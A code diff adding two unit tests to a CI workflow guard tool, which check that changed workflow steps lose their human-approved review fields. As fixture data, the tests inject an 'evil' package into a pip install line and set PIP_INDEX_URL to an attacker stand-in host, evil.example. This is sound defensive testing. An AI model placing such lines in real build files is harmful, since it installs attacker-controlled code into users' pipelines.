@@ -972,6 +972,36 @@ class BaselineUpdateTests(GuardTestCase):
         self.repo.write_manifest(manifest)
         self.assertRed("MANIFEST_ERROR")
 
+    def test_update_resets_review_fields_when_behavior_changes(self):
+        # a changed authorization needs a fresh human reason, not the old one
+        self.repo.replace(
+            WF, "pip install python-magic\n", "pip install python-magic evil\n"
+        )
+        manifest = guard.build_manifest(
+            self.repo.root, existing=self.repo.load_manifest_json()
+        )
+        by_ctx = {e["context"]: e for e in manifest["entries"]}
+        for key in ("reason", "owner", "remediation_issue"):
+            self.assertTrue(by_ctx[CTX_MAGIC][key].startswith("TODO"), key)
+        # unchanged contexts keep their reviewed fields
+        self.assertEqual(by_ctx[CTX_DEPS]["reason"], "fixture authorization")
+        self.assertEqual(by_ctx[CTX_ACTION]["owner"], "@fixture")
+        # so a regenerated baseline cannot silently re-authorize the change
+        self.repo.write_manifest(manifest)
+        self.assertRed("MANIFEST_ERROR")
+
+    def test_update_resets_review_fields_when_only_env_changes(self):
+        self.repo.replace(
+            WF,
+            "      - id: magic\n",
+            "      - id: magic\n        env:\n          PIP_INDEX_URL: https://evil.example/simple\n",
+        )
+        manifest = guard.build_manifest(
+            self.repo.root, existing=self.repo.load_manifest_json()
+        )
+        by_ctx = {e["context"]: e for e in manifest["entries"]}
+        self.assertTrue(by_ctx[CTX_MAGIC]["reason"].startswith("TODO"))
+
     def test_update_drops_stale_entries(self):
         self.repo.remove(ACTION)
         manifest = guard.build_manifest(
